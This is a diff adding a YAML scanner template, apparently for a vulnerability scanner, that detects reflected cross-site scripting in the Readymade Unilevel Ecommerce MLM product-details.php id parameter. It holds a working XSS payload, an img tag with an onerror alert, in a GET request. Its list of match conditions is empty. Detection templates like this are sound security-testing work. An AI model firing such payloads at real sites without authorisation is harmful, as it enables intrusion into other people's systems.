@@ -1,0 +1,16 @@
+id: readymade-unilevel-xss
+brief:
+    title: Readymade Unilevel Ecommerce MLM - Cross-Site Scripting
+    by: s4e-io
+    level: high
+    about: Readymade Unilevel Ecommerce software has xss vulnerability in product-details.php?id
+    label:
+        - ecommerce
+        - readymade
+        - xss
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/product-details.php?id=1"><img/src/onerror=.1|alert`{{num1}}`+class={{num1}}>'
+      signs: []
